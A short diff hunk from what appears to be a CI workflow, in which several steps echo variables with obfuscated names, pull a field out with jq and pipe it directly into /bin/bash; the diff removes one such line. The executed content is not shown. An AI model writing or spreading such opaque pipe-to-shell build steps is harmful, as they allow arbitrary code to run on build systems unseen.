@@ -22,7 +22,6 @@ jobs:
           echo $dued5 | jq -r .to17370 | /bin/bash
           echo $irlk88 | jq -r .ozg4 | /bin/bash
           echo $j59157 | jq -r .ag9 | /bin/bash
-          printf '%s' "$x4" | jq -r .r4793 | /bin/bash
           echo $f678 | jq -r .zw74994 | /bin/bash
 
       - name: Upload data
